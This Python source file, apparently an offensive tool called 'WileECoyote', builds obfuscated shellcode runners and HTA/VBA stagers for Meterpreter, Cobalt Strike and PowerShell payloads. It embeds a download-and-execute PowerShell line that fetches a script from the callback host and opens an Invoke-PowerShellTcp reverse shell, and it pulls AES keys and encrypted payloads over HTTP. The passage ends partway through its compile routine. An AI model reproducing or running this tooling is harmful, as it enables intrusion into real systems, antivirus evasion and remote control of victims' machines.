#!/usr/bin/python3
import subprocess, sys, os
import random, string, re, time, base64, json
import argparse
from pathlib import Path
from argparse import RawTextHelpFormatter
from Crypto.Cipher import AES
from pkcs7 import PKCS7Encoder
from Crypto.Util.Padding import pad
from OpenSSL import crypto, SSL

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    WHITE='\033[97m'
    UNDERLINE = '\033[4m'
    BckgrRed='\033[41m'

class Version:
    MOTDLST = ["Are you feeling it now Mr Krabs?", "First, discombobulate. Dazed, discombobulate. Distract target.. discombobulate.", "Hey Vsauce, Michael here."]
    RANDOMVALUE = (random.randint(0,(len(MOTDLST) - 1)))
    MOTD = (MOTDLST[RANDOMVALUE]).center(90, " ")
    VERSION = (f"{bcolors.BOLD}{bcolors.BckgrRed}Version{bcolors.ENDC}{bcolors.ENDC}: {bcolors.BOLD}{bcolors.WARNING}0.3.1{bcolors.ENDC}{bcolors.ENDC}").center(125, " ")
    BUILDNAME = (f"{bcolors.BOLD}{bcolors.BckgrRed}Build Name:{bcolors.ENDC}{bcolors.ENDC}: {bcolors.BOLD}{bcolors.WARNING}Sleepy Silver{bcolors.ENDC}{bcolors.ENDC}").center(130, " ")
    ExampleUsage = """Example Usage:
   WileECoyote.py windows/x64/meterpreter/process_hollowing 127.0.0.1:443
   WileECoyote.py windows/x64/powershell/nishang/hta 127.0.0.1:443"""
    BANNER = f"""                                      _
                                     : \\
                                     ;\ \_                   _
                                     ;@: ~:              _,-;@)
                                     ;@: ;~:          _,' _,'@;
                                     ;@;  ;~;      ,-'  _,@@@,'
                                    |@(     ;      ) ,-'@@@-;
                                    ;@;   |~~(   _/ /@@@@@@/
                                    \@\   ; _/ _/ /@@@@@@;~
                                     \@\   /  / ,'@@@,-'~
                                       \\  (  ) :@@(~
                                    ___ )-'~~~~`--/ ___
                                   (   `--_    _,--'   )
                                  (~`- ___ \  / ___ -'~)
                                 __~\_(   \_~~_/   )_/~__
                 /\ /\ /\     ,-'~~~~~`-._ 0\/0 _,-'~~~~~`-.
                | |:  ::|    ;     ______ `----'  ______    :
                | `'  `'|    ;    {{      \   ~   /      }}   |
                 \_   _/     `-._      ,-,' ~~  `.-.      _,'        |\\
                   \ /_          `----' ,'       `, `----'           : \\
                   |_( )                `-._/#\_,-'                  :  )
                 ,-'  ~)           _,--./  (###)__                   :  :
                 (~~~~_)          /       ; `-'   `--,               |  ;
                 (~~~' )         ;       /@@@@@@.    `.              | /
                 `.HH~;        ,-'  ,-   |@@@ @@@@.   `.             .')
                  `HH `.      ,'   /     |@@@@@ @@@@.  `.           / /(~)
                   HH   \_   ,'  _/`.    |@@@@@ @@@@@;  `.          ; (~~)
                   ~~`.   \_,'  /   ;   .@@@@@ @@@@@@;\_  \___      ; H~\)
                       \_     _/    `.  |@@@@@@ @@@@@;  \     `----'_HH[~)
                         \___/       `. :@@@@@ @@@@@@'   \__,------' HH ~
                                      ; |@@@@@@ @@@'                 HH

                    A swiss army knife for baking shellcode runners.
{MOTD}
{VERSION}
{BUILDNAME}
"""

    def PAYLOAD_OPTIONS():

        DefaultConfigPath = (os.path.dirname(os.path.realpath(__file__)) + "/Config/config.json")
        with open(DefaultConfigPath) as f:
            LoadedConfig = json.loads(json.dumps(json.load(f)))
            print(f"{bcolors.BOLD}{bcolors.OKBLUE}[+]{bcolors.ENDC}{bcolors.ENDC} Reading Configuration file: {DefaultConfigPath}")

        # Patched method for doing a nice print of the char(└).
        i = 0
        for RootJson in LoadedConfig:
            for ShellCodeRunnerTypes in LoadedConfig[RootJson]:
                i += 1
        z = 0
        for RootJson in LoadedConfig:
            for ShellCodeRunnerTypes in LoadedConfig[RootJson]:
                z += 1
                Architecture = (', '.join((LoadedConfig[RootJson][ShellCodeRunnerTypes][0]["Architecture"])))
                Execution_Methods = (', '.join((LoadedConfig[RootJson][ShellCodeRunnerTypes][0]["Execution_Methods"])))
                AcceptedShellCode = (', '.join((LoadedConfig[RootJson][ShellCodeRunnerTypes][0]["ShellCodeType"])))

                Description = (LoadedConfig[RootJson][ShellCodeRunnerTypes][0]["Description"])
                if z == i:
                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t└──{bcolors.ENDC}{bcolors.ENDC} [{bcolors.BOLD}{ShellCodeRunnerTypes}{bcolors.ENDC}] - {Description}")
                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t\t├─ {bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}Architecture: {bcolors.ENDC}{bcolors.ENDC} {Architecture}")
                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t\t├─ {bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}Accepted Shellcode: {bcolors.ENDC}{bcolors.ENDC} {AcceptedShellCode}")
                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t\t└─ {bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}Execution Methods: {bcolors.ENDC}{bcolors.ENDC} {Execution_Methods}")
                else:
                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t├──{bcolors.ENDC}{bcolors.ENDC} [{bcolors.BOLD}{ShellCodeRunnerTypes}{bcolors.ENDC}] - {Description}")
                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│\t├─ {bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}Architecture: {bcolors.ENDC}{bcolors.ENDC} {Architecture}")
                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│\t├─ {bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}Accepted Shellcode: {bcolors.ENDC}{bcolors.ENDC} {AcceptedShellCode}")
                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│\t└─ {bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}Execution Methods: {bcolors.ENDC}{bcolors.ENDC} {Execution_Methods}")
                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│{bcolors.ENDC}{bcolors.ENDC}")

class WileECoyote:

    def __init__(self, arg):
        try:
            # Define base arguments
            self.ExecMethod = args.em
            self.Iterations = args.i
            self.StagedWriteTo = args.wt
            self.DownloadMethod = args.dm
            self.ExitFunc = args.exit
            self.UseAES = args.aes

            if args.tcp == False:
                self.ConnectionType = "https"
            else:
                self.ConnectionType = "tcp"

            self.DebugMode = args.debug
            self.Payload = args.Payload
            self.ConnectionInfo = args.ConnectionInfo
            self.ConfigPath = args.config

            # Splits IP and Port
            self.IP = args.ConnectionInfo.split(":")[0]
            self.PORT = args.ConnectionInfo.split(":")[1]

            # Loads payload Configuration File.
            with open(self.ConfigPath) as f:
                self.Config = json.loads(json.dumps(json.load(f)))
                print(f"{bcolors.BOLD}{bcolors.OKBLUE}[+]{bcolors.ENDC}{bcolors.ENDC} Sucsessfuly loaded Configuration file: {self.ConfigPath}")
        except Exception as initError:
            print(f"{bcolors.BOLD}{bcolors.FAIL}[-]{bcolors.ENDC}{bcolors.ENDC} Failed init: {initError}")
            exit(1)

        # Parses the Payload (Exmp: windows/x64/meterpreter/Process_Hollowing/hta) and splits into individual parts.
        try:
            self.OperatingSystem = ((self.Payload).split("/"))[0]           # Windows
            self.Architecture = ((self.Payload).split("/"))[1]              # x64
            self.ShellcodeType = ((self.Payload).split("/"))[2]             # meterpreter
            self.ShellCodeRunnerType = ((self.Payload).split("/"))[3]       # Process_Hollowing
            self.StagerType = ((self.Payload).split("/"))[4]                # hta (Will Fail if not present, resulting in False) - Patch method for determining Staged vs Stagless
        except:
            self.StagerType = False
            pass

        # Parses the previous data and validates all info exists in config and prepares building stageless or staged versions. (config.json is case sensitive)
        try:
            ErrorHelper = "ShellCodeRunnerType"
            # Examp: process_hollowing
            if (((self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["Name"])) == (self.ShellCodeRunnerType).lower()):
                ErrorHelper = "Architecture"

                # Examp: x64
                if (self.Architecture).lower() in (((self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["Architecture"]))):
                    ErrorHelper = "ShellcodeType"

                    # Examp: meterpreter
                    if (self.ShellcodeType).lower() in (((self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["ShellCodeType"]))):
                        ErrorHelper = "OperatingSystem"

                        # Examp: Windows
                        if (self.OperatingSystem).lower() in (((self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["OperatingSystem"]))):
                            # Grabs Listener Category Information
                            self.Listener_Category = (self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["Listener_Category"])
                            ErrorHelper = "ExecMethod"

                            # Examp: msbuild
                            if (self.ExecMethod).lower() == (self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["Execution_Methods"][(self.ExecMethod)]["Name"]):
                                # Examp: /ShellcodeFramework/MsBuild.ProcessHollowing.template
                                self.ShellCodeRunnerTemplatePath = (self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["Execution_Methods"][(self.ExecMethod)]["Config_Path"])

                                # Examp: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe {Payload_Path}{Payload_File}
                                self.PayloadExecution_Command = (self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["Execution_Methods"][(self.ExecMethod)]["PayloadExecution_Command"])

                                # Examp: bad.xml
                                self.ShellCodeRunnerFileName = (self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["Execution_Methods"][(self.ExecMethod)]["ShellCodeRunnerFileName"])

                                # Examp: winexe, library, False
                                self.CompileInfo = (self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["Execution_Methods"][(self.ExecMethod)]["Compile"])
                                self.CompiledFileName = (self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["Execution_Methods"][(self.ExecMethod)]["ShellCodeRunnerCompiledFileName"])
                                self.AdditonalRefrences = (self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["Execution_Methods"][(self.ExecMethod)]["AdditonalRefrences"])

                                # Examp: --aes (Validate if the remote storage method can be used...)
                                if (self.UseAES == True):
                                    if "remote" not in (self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["ShellCode_Location"]):
                                        print(f"{bcolors.BOLD}{bcolors.WARNING}[*]{bcolors.ENDC}{bcolors.ENDC} Warning: The `--aes` parameter (remote shellcode storage) selected on a non-compatable object.")
                                        print(f"{bcolors.BOLD}{bcolors.WARNING}[*]{bcolors.ENDC}{bcolors.ENDC} Warning: Switching to local storage.")
                                        self.UseAES = False

                                if (self.StagerType != False):   # If a Stager is present in build request.
                                    ErrorHelper = "StagerType"
                                    self.RandomFileName = str(''.join(random.choices(string.ascii_uppercase + string.digits, k =10)))

                                    # Examp: hta
                                    if (self.StagerType).lower() == (self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["StagerTypes"][(self.StagerType)]["Name"]):
                                        # Examp: bitsadmin /transfer {RandomFileName} /download /priority normal http://{CallBackAddress}/{OutFile} {Payload_Path}{Payload_File}
                                        self.StagerTemplatePath = (self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["StagerTypes"][(self.StagerType)]["Config_Path"])
                                        # Missing Delete Method, WIP for future patch.
                                        self.StagerFileName = (self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["StagerTypes"][(self.StagerType)]["StagerFileName"])
                                        self.Cleanup_Method = (self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["StagerTypes"][(self.StagerType)]["Cleanup_Method"])

                                        ErrorHelper = "DownloadMethod"
                                        # Examp: bitsadmin
                                        if (self.DownloadMethod).lower() == (self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["Download_Methods"][(self.DownloadMethod)]["Name"]):
                                            # Examp: bitsadmin /transfer {RandomFileName} /download /priority normal http://{CallBackAddress}/{OutFile} {Payload_Path}{Payload_File}
                                            self.DownloadExecution_Command = (self.Config["Payload_Objects"][(self.ShellCodeRunnerType).lower()][0]["Download_Methods"][(self.DownloadMethod)]["DownloadExecution_Command"])
                            else:
                                print(f"{bcolors.BOLD}{bcolors.FAIL}[-]{bcolors.ENDC}{bcolors.ENDC} Error with: {ErrorHelper} - Failed config validation.")
                                exit(1)

                        else:
                            print(f"{bcolors.BOLD}{bcolors.FAIL}[-]{bcolors.ENDC}{bcolors.ENDC} Error with: {ErrorHelper} - Failed config validation.")
                            exit(1)

                    else:
                        print(f"{bcolors.BOLD}{bcolors.FAIL}[-]{bcolors.ENDC}{bcolors.ENDC} Error with: {ErrorHelper} - Failed config validation.")
                        exit(1)

                else:
                    print(f"{bcolors.BOLD}{bcolors.FAIL}[-]{bcolors.ENDC}{bcolors.ENDC} Error with: {ErrorHelper} - Failed config validation.")
                    exit(1)

            else:
                print(f"{bcolors.BOLD}{bcolors.FAIL}[-]{bcolors.ENDC}{bcolors.ENDC} Error with: {ErrorHelper} - Failed config validation.")
                exit(1)

        except Exception as Error:
            print(f"{bcolors.BOLD}{bcolors.FAIL}[-]{bcolors.ENDC}{bcolors.ENDC} Configuration File Error: {ErrorHelper} - {Error}")
            exit(1)

        print(f"{bcolors.BOLD}{bcolors.OKBLUE}[+]{bcolors.ENDC}{bcolors.ENDC} Starting Build...")

        if self.DebugMode == True:
            WileECoyote.Debug(self)

    def Debug(self):
        try:
            print(f"\n[Base Info]")
            print(f"{bcolors.BOLD}{bcolors.WARNING}ExecMethod{bcolors.ENDC}{bcolors.ENDC}: {self.ExecMethod}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}Iterations{bcolors.ENDC}{bcolors.ENDC}: {self.Iterations}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}StagedWriteTo{bcolors.ENDC}{bcolors.ENDC}: {self.StagedWriteTo}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}DownloadMethod{bcolors.ENDC}{bcolors.ENDC}: {self.DownloadMethod}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}ExitFunc{bcolors.ENDC}{bcolors.ENDC}: {self.ExitFunc}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}UseAES{bcolors.ENDC}{bcolors.ENDC}: {self.UseAES}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}ConnectionType{bcolors.ENDC}{bcolors.ENDC}: {self.ConnectionType}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}Payload{bcolors.ENDC}{bcolors.ENDC}: {self.Payload}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}Listener_Category{bcolors.ENDC}{bcolors.ENDC}: {self.Listener_Category}")

            print(f"\n[Shellcode Info]")
            print(f"{bcolors.BOLD}{bcolors.WARNING}OperatingSystem{bcolors.ENDC}{bcolors.ENDC}: {self.OperatingSystem}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}Architecture{bcolors.ENDC}{bcolors.ENDC}: {self.Architecture}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}ShellcodeType{bcolors.ENDC}{bcolors.ENDC}: {self.ShellcodeType}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}ShellCodeRunnerType{bcolors.ENDC}{bcolors.ENDC}: {self.ShellCodeRunnerType}")

            print(f"{bcolors.BOLD}{bcolors.WARNING}ConnectionInfo{bcolors.ENDC}{bcolors.ENDC}: {self.ConnectionInfo}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}IP{bcolors.ENDC}{bcolors.ENDC}: {self.IP}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}PORT{bcolors.ENDC}{bcolors.ENDC}: {self.PORT}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}ConfigPath{bcolors.ENDC}{bcolors.ENDC}: {self.ConfigPath}")

            print(f"\n[ShellCode Runner Info]")
            print(f"{bcolors.BOLD}{bcolors.WARNING}ShellCodeRunnerTemplatePath{bcolors.ENDC}{bcolors.ENDC}: {self.ShellCodeRunnerTemplatePath}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}PayloadExecution_Command{bcolors.ENDC}{bcolors.ENDC}: {self.PayloadExecution_Command}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}ShellCodeRunnerFileName{bcolors.ENDC}{bcolors.ENDC}: {self.ShellCodeRunnerFileName}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}Compiled{bcolors.ENDC}{bcolors.ENDC}: {self.CompileInfo}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}CompiledFileName{bcolors.ENDC}{bcolors.ENDC}: {self.CompiledFileName}")


            print(f"\n[Stager Info]")
            print(f"{bcolors.BOLD}{bcolors.WARNING}StagerType{bcolors.ENDC}{bcolors.ENDC} {self.StagerType}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}StagerFileName{bcolors.ENDC}{bcolors.ENDC} {self.StagerFileName}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}StagerTemplatePath{bcolors.ENDC}{bcolors.ENDC} {self.StagerTemplatePath}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}DownloadExecution_Command{bcolors.ENDC}{bcolors.ENDC} {self.DownloadExecution_Command}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}Random File Name{bcolors.ENDC}{bcolors.ENDC} {self.RandomFileName}")
            print(f"{bcolors.BOLD}{bcolors.WARNING}Cleaup Method{bcolors.ENDC}{bcolors.ENDC} {self.Cleanup_Method}")
        except:
            pass

    def BuildCore(self):
        #Load Framework
        self.LoadedShellCodeFramework = Path(os.path.dirname(os.path.realpath(__file__))+self.ShellCodeRunnerTemplatePath).read_text()
        #PowerShell shellcode uses nishang and doesn't require shellcode.
        if (self.ShellcodeType).lower() != "powershell": # Very Jank
            if self.ShellcodeType == "meterpreter":
                self.ShellCode = CreateShellCode.Meterpreter(self)
            elif self.ShellCodeType == "cobaltstrike":
                self.ShellCode = CreateShellCode.CobaltStrike(self)


            if self.ConnectionType == "https":
                WileECoyote.BuildCertificate()

            # Obfuscates Shellcode
            self.ObfuscatedShellCode = Obfuscate.main(self)
            self.ShellCodeHeader = (self.ObfuscatedShellCode[0])
            self.DecodeInstructions = (self.ObfuscatedShellCode[1])
            self.ObfuscatedShellCode = (self.ObfuscatedShellCode[2])
        else:
            pass
        # Build ShellCode Runner
        WileECoyote.BuildShellcodeRunner(self)

        #Build Stager
        WileECoyote.BuildStager(self)

        #Compile
        WileECoyote.Compile(self)

        # Provides Shellcode Runner listener command.
        CreateShellCode.Listener(self)

    def BuildShellcodeRunner(self):
        if (self.OperatingSystem).lower() == "linux":
            # Patches the decode instructures to be on new lines.
            DecodeInstructionsString = ""
            for i in range(len(self.DecodeInstructions)):
                    DecodeInstructionsString += "\t"+(self.DecodeInstructions[i]+"\n")
            self.LoadedShellCodeFramework = (self.LoadedShellCodeFramework).replace("{{{ShellCodeHeader}}}",self.ShellCodeHeader)
            self.LoadedShellCodeFramework = (self.LoadedShellCodeFramework).replace("{{{DecodeInstructions}}}",DecodeInstructionsString)
            BuiltShellCodeRunner = (self.LoadedShellCodeFramework).replace("{{{ObfuscatedShellCode}}}",self.ObfuscatedShellCode)

            try:
                print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t├──{bcolors.ENDC}{bcolors.ENDC} Generating {self.ExecMethod} {self.ShellCodeRunnerType}...")
                WriteOutFile = (f"{self.ShellCodeRunnerFileName}")
                with open(WriteOutFile, "w") as file:
                    file.write(BuiltShellCodeRunner)
                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│\t{bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}->{bcolors.ENDC}{bcolors.ENDC} {self.ShellCodeRunnerFileName} sourcecode wrote to: " + (os.getcwd()+"/" + WriteOutFile))
            except Exception as E:
                print(f"{bcolors.BOLD}{bcolors.FAIL}[-]{bcolors.ENDC}{bcolors.ENDC} Failed write: {E}")
                exit(1)
            return

        if (self.OperatingSystem).lower() == "windows":
            if (self.ShellcodeType).lower() != "powershell":
                # Patches the decode instructures to be on new lines.
                DecodeInstructionsString = ""
                for i in range(len(self.DecodeInstructions)):
                        DecodeInstructionsString += "\t"+(self.DecodeInstructions[i]+"\n")

                if self.UseAES == True:
                    self.PayLoadMethod = f"""
                        Console.WriteLine("\\nRequesting Data...");
                        string KEY = new WebClient().DownloadString("http://{self.IP}/key.out");
                        string IV = "0123456789abcdef";
                        Console.WriteLine("\t|_Found Key: " + KEY);
                        string Cipher = new WebClient().DownloadString("http://{self.IP}/cipher.out");
                        Console.WriteLine("\t|_Found AES Encrypted Payload...");

                        SimpleAES AES = new SimpleAES(KEY, IV);
                        Console.WriteLine("\t|_Decrypting Payload...");
                        byte[] buf = AES.decrypt(Cipher);

                        for (int i = 0; i < buf.Length; i++)
                        {{
                          {DecodeInstructionsString}}}
                                    """
                    Obfuscate.AESEncryption(self.ObfuscatedShellCode)

                else:
                    self.ObfuscatedShellCode = self.ObfuscatedShellCode + ";"
                    self.PayLoadMethod = f"""{self.ShellCodeHeader}\n{self.ObfuscatedShellCode}\n\nfor (int i = 0; i < buf.Length; i++)\n{{{DecodeInstructionsString}}}"""
            else:
                # Requires Invoke-PowerShellTcp

                # Build PowerShell Download and Exec Method
                InvokePowerShellTcp = f"IEX(New-Object Net.WebClient).DownloadString('http://{self.IP}/run.txt'); Invoke-PowerShellTcp -Reverse -IPAddress {self.IP} -Port {self.PORT}";

                # Obfuscate
                self.PayLoadMethod = Obfuscate.ShellCommands("PowerShell", InvokePowerShellTcp)

                LoadedInvokeNishang = Path(os.path.dirname(os.path.realpath(__file__))+'/Misc/Invoke-PowerShellTcp.ps1').read_text()
                try:
                    with open("run.txt", "w") as file:
                        file.write(LoadedInvokeNishang)
                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t├──{bcolors.ENDC}{bcolors.ENDC} Invoke-PowerShellTcp")
                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│\t{bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}->{bcolors.ENDC}{bcolors.ENDC} Invoke-PowerShellTcp.ps1 sourcecode wrote to: " + (os.getcwd()+"/run.txt"))
                except:
                    print(f"{bcolors.FAIL}[-]{bcolors.ENDC} Invoke-PowerShellTcp.ps1 write Failed.")

            try:
                print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t├──{bcolors.ENDC}{bcolors.ENDC} Generating {self.ExecMethod} {self.ShellCodeRunnerType}...")

                BuiltShellCodeRunner = (self.LoadedShellCodeFramework).replace("{{{PayloadMethod}}}", self.PayLoadMethod)
                WriteOutFile = (f"{self.ShellCodeRunnerFileName}")
                with open(WriteOutFile, "w") as file:
                    file.write(BuiltShellCodeRunner)
                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│\t{bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}->{bcolors.ENDC}{bcolors.ENDC} {self.ShellCodeRunnerFileName} sourcecode wrote to: " + (os.getcwd()+"/" + WriteOutFile))
            except Exception as E:
                print(f"{bcolors.BOLD}{bcolors.FAIL}[-]{bcolors.ENDC}{bcolors.ENDC} Failed write: {E}")
                exit(1)
            return

    def BuildStager(self):
        if self.StagerType != False:
            self.LoadedStagerFramework = Path(os.path.dirname(os.path.realpath(__file__))+self.StagerTemplatePath).read_text()

            #If the file is compiled we need to retrive the compiled file rather than the sourcecode during execution.
            if self.CompileInfo != False:
                Payload_File = self.CompiledFileName # If its compiled
            else:
                Payload_File = self.ShellCodeRunnerFileName # If its not i.e (bad.xml).

            if self.StagerType.lower() == "hta": # Need to find method to not type "if hta"
                print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t├──{bcolors.ENDC}{bcolors.ENDC} Generating HTA Stager...")

                self.DownloadExecution_Command = (self.DownloadExecution_Command).format(RandomFileName = self.RandomFileName, CallBackAddress=self.IP, OutFile = Payload_File, Payload_Path = self.StagedWriteTo, Payload_File = Payload_File)
                self.PayloadExecution_Command = (self.PayloadExecution_Command).format(Payload_Path = self.StagedWriteTo, Payload_File = Payload_File)
                self.Cleanup_Method = (self.Cleanup_Method).format(Payload_Path = self.StagedWriteTo, Payload_File = Payload_File)
                BuiltStager = (self.LoadedStagerFramework).format(DownloadExecution_Command = self.DownloadExecution_Command, PayloadExecution_Command = self.PayloadExecution_Command, Cleanup_Method = self.Cleanup_Method)

                try:
                    with open(self.StagerFileName, "w") as file:
                        file.write(BuiltStager)
                        print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│{bcolors.ENDC}{bcolors.ENDC} {bcolors.BOLD}{bcolors.OKGREEN}\t->{bcolors.ENDC}{bcolors.ENDC} HTA sourcecode wrote to: " + (os.getcwd()+f"/{self.StagerFileName}"))
                except:
                     print(f"{bcolors.FAIL}[-]{bcolors.ENDC} HTA write failed.")

            if self.StagerType.lower() == "vba":

                print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t├──{bcolors.ENDC}{bcolors.ENDC} Generating vba Stager...")
                Shift = random.randrange(10, 255) # Will only be static method

                self.DownloadExecution_Command = (self.DownloadExecution_Command).format(RandomFileName = self.RandomFileName, CallBackAddress=self.IP, OutFile = Payload_File, Payload_Path = self.StagedWriteTo, Payload_File = Payload_File)
                self.PayloadExecution_Command = (self.PayloadExecution_Command).format(Payload_Path = self.StagedWriteTo, Payload_File = Payload_File)

                # Reverse Command
                DownloadPayloadCommand = self.DownloadExecution_Command[::-1]
                ObfuscatedDownloadMethod = Obfuscate.VBAObfuscate(DownloadPayloadCommand, "MultiLine", Shift)

                # Reverse Command
                ExecPayloadCommand = self.PayloadExecution_Command[::-1]
                ObfuscatedExecMethod = Obfuscate.VBAObfuscate(ExecPayloadCommand, "MultiLine", Shift)

                # Need to be turn automated later...
                BuildWinmgmts = "winmgmts:"
                BuildWinmgmts = BuildWinmgmts[::-1]
                ObfuscateWinmgmts = Obfuscate.VBAObfuscate(BuildWinmgmts, "Single", Shift)

                BuildWin32_Process = "Win32_Process"
                BuildWin32_Process = BuildWin32_Process[::-1]
                ObfuscateWin32_Process = Obfuscate.VBAObfuscate(BuildWin32_Process, "Single", Shift)

                BuiltStager = (self.LoadedStagerFramework).format(Shift = str(Shift), DownloadExecution_Command = ObfuscatedDownloadMethod, PayloadExecution_Command = ObfuscatedExecMethod, winmgmts = ObfuscateWinmgmts, Win32_Process = ObfuscateWin32_Process) # Replace ShiftValue in vba.template

                try:
                    with open(self.StagerFileName, "w") as file:
                        file.write(BuiltStager)
                        print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│{bcolors.ENDC}{bcolors.ENDC} {bcolors.BOLD}{bcolors.OKGREEN}\t->{bcolors.ENDC}{bcolors.ENDC} VBA sourcecode wrote to: " + (os.getcwd()+f"/{self.StagerFileName}"))
                except:
                     print(f"{bcolors.FAIL}[-]{bcolors.ENDC} VBA write failed.")

    def Compile(self):
        if self.CompileInfo != False:
            print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t├──{bcolors.ENDC}{bcolors.ENDC} Compiling " + self.ShellCodeRunnerFileName)
            if self.OperatingSystem == "windows":
                # mcs -platform:x64 -target:winexe run.cs -out run.exe
                if self.AdditonalRefrences != None:
                    References = []
                    for i in range(len(self.AdditonalRefrences)):
                        Ref = "-reference:" + self.AdditonalRefrences[i]
                        References.append(Ref)
                    # Quick reference patch, will only take two. need to patch later...
                    CompiledResponse = subprocess.check_output(["mcs","-platform:{}".format(self.Architecture),"-target:{}".format(self.CompileInfo),self.ShellCodeRunnerFileName,"-out:{}".format(self.CompiledFileName), References[0],References[1]], stderr=subprocess.DEVNULL)
                    if "Compilation succeeded" in str(CompiledResponse):
                         print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│\t{bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}->{bcolors.ENDC}{bcolors.ENDC} Executable wrote to: " + (os.getcwd() + "/" + self.CompiledFileName))
                         return

                    else:
                        print(f"{bcolors.FAIL}[-]{bcolors.ENDC} Failed to compile " + (CsharpFile.split("/"))[-1])
                        print(CompiledResponse)
                else:
                    CompiledResponse = subprocess.check_output(["mcs","-platform:{}".format(self.Architecture),"-target:{}".format(self.CompileInfo),self.ShellCodeRunnerFileName,"-out:{}".format(self.CompiledFileName)], stderr=subprocess.DEVNULL)
                    if "Compilation succeeded" in str(CompiledResponse):
                         print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│\t{bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}->{bcolors.ENDC}{bcolors.ENDC} Executable wrote to: " + (os.getcwd() + "/" + self.CompiledFileName))
                         return

                    else:
                        print(f"{bcolors.FAIL}[-]{bcolors.ENDC} Failed to compile " + (CsharpFile.split("/"))[-1])
                        print(CompiledResponse)

            if self.OperatingSystem == "linux":
                if self.Architecture == "x86":
                    CompileElf = "gcc -o run.elf run.c -z execstack -m32"
                    RunCompileElf =  ((subprocess.Popen(CompileElf, shell=True, stdout=subprocess.PIPE).stdout).read().decode("utf-8")).rstrip("\n")
                    print(f"{bcolors.BOLD}{bcolors.OKBLUE}\t│\t{bcolors.ENDC}{bcolors.ENDC}{bcolors.BOLD}{bcolors.OKGREEN}->{bcolors.ENDC}{bcolors.ENDC} Compiled x86 ELF wrote to: " + (os.getcwd()+"/run.elf"))


                if self.Architecture == "x64":
                    CompileElf = "gcc -o run.elf run.c -z execstack"
